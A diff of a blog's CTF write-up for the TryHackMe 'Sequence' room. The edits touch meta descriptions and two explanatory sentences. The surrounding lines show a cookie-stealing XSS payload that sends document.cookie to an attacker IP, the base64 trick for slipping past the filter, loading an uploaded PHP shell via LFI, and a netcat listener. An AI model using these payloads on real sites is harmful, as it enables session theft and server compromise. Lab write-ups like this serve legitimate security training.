@@ -7,7 +7,7 @@
 <meta name="robots" content="index, follow">
 <title>Sequence | Jenn Shagrin</title>
 <meta name="keywords" content="">
-<meta name="description" content="TryHackMe CTF — Nmap recon, information disclosure via exposed mail dump, stored XSS with base64-encoded SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, PHP web shell upload, and Docker socket abuse for host root.">
+<meta name="description" content="TryHackMe CTF: Nmap recon, information disclosure via exposed mail dump, stored XSS with base64-encoded SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, PHP web shell upload, and Docker socket abuse for host root.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/sequence.html">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
@@ -71,12 +71,12 @@
 <meta property="og:url" content="https://jennshaggy.github.io/sequence.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Sequence">
-<meta property="og:description" content="TryHackMe CTF — Stored XSS with base64 SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, and Docker socket abuse for host root.">
+<meta property="og:description" content="TryHackMe CTF: Stored XSS with base64 SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, and Docker socket abuse for host root.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sequence">
-<meta name="twitter:description" content="TryHackMe CTF — Stored XSS with base64 SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, and Docker socket abuse for host root.">
+<meta name="twitter:description" content="TryHackMe CTF: Stored XSS with base64 SVG payload, CSRF via meta refresh redirect, privilege escalation to admin, and Docker socket abuse for host root.">
 </head>
 
 <body id="top">
@@ -234,7 +234,7 @@ Thanks, Robert.</p>
 
 <p>Fire away!</p>
 
-<p>Nope. Just kidding. As-expected, the payload needs base64 encoding. Since the browser will not natively decode base64, we handle it client-side with <code>atob()</code>.</p>
+<p>Nope. Just kidding. As expected, the payload needs base64 encoding. The wrapping serves two purposes: it hides the inner JS from the filter&rsquo;s signature checks, and the browser decodes it at runtime via <code>atob()</code>.</p>
 
 <pre><code>echo -n "fetch('http://192.168.128.19:4444/?c='+document.cookie)" | base64</code></pre>
 
@@ -444,7 +444,7 @@ Content-Length: 25
 
 feature=uploads/shell.php</code></pre>
 
-<p>Start a listener in a new terminal:</p>
+<p>The <code>feature</code> parameter on <code>dashboard.php</code> controls which page loads. Pointing it at the uploaded shell exploits an LFI in the feature loader. Start a listener in a new terminal:</p>
 
 <pre><code>nc -lvnp 443</code></pre>
 
